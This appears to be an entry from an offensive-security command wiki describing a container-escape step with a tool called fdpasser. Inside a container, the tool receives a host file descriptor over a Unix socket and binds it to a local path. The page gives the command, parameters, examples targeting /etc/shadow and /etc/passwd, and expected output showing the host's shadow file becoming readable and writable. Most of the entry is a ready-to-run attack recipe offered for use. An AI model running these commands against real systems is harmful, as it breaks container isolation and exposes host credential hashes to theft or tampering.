---
type: command
executor: bash
data: ./fdpasser recv /moo /etc/shadow
platforms:
  - Linux
tags:
  - container-escape
  - fdpasser
verified: true
validated: true
---

# fdpasser-recv-bind-file-descriptor-in-container

## Command

```bash
./fdpasser recv $_LOCAL_BIND_PATH $_TARGET_FILE
```

## Description

This command receives an open file descriptor over a Unix domain socket inside the container and binds it to a specified local path, enabling access to a host target file (e.g., /etc/shadow) as part of a container escape technique. Use this when root in the container to bridge namespaces.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LOCAL_BIND_PATH | Local path in container to bind the received FD (e.g., /moo) | Yes |
| $_TARGET_FILE | Host file targeted for access (e.g., /etc/shadow; used for context in binding) | Yes |

## Examples

### Basic Usage

```bash
./fdpasser recv /moo /etc/shadow
```

### Advanced Usage

```bash
./fdpasser recv /tmp/host_access /etc/passwd
```
(Adjust socket path if non-default.)

## Expected Output

```
File descriptor received and bound to /moo
```

The bound path (/moo) can now be read/written as the host file, e.g., `cat /moo` reveals /etc/shadow contents.

## Related

- [[procedures/Container-Escape-Using-Device-File]]
- [[tools/fdpasser]]
